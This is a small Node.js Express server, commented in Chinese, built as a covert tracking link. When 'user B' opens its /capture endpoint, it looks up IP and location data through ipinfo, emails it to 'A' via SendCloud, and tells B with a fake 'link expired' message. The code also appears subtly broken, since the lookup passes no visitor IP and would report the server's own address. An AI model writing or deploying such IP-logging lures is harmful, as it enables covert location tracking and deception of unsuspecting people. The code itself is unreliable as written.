const express = require('express');
const axios = require('axios');
const querystring = require('querystring');

// 创建Express应用
const app = express();

const IPINFO_TOKEN = process.env.IPINFO_TOKEN; // 从Render环境变量中读取
const SENDCLOUD_API_USER = process.env.SENDCLOUD_API_USER;
const SENDCLOUD_API_KEY = process.env.SENDCLOUD_API_KEY;
const EMAIL_RECEIVER = process.env.EMAIL_RECEIVER; // 使用环境变量定义接收者邮箱地址

// 设置端点以捕获B用户的请求
app.get('/capture', async (req, res) => {
    try {
        // 调用ipinfo API获取B用户的信息
        const response = await axios.get(`https://ipinfo.io?token=${IPINFO_TOKEN}`);
        const ipData = response.data;

        // 构建发送给A的邮件内容
        const mailOptions = {
            apiUser: SENDCLOUD_API_USER,
            apiKey: SENDCLOUD_API_KEY,
            to: EMAIL_RECEIVER,
            from: 'SendCloud@eixcst.sendcloud.org',
            subject: '新用户访问通知',
            html: `<p>B用户的访问数据如下：</p><pre>${JSON.stringify(ipData, null, 2)}</pre>`
        };

        // 使用SendCloud API发送邮件
        const mailResponse = await axios.post(
            'https://api.sendcloud.net/apiv2/mail/send',
            querystring.stringify(mailOptions)
        );

        // 返回给B用户的响应
        res.send('链接失效了，重新获取吧');
    } catch (error) {
        console.error(error);
        res.status(500).send('出现错误，请稍后再试。');
    }
});

// 启动应用监听端口
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`应用正在运行在端口 ${PORT}`);
});
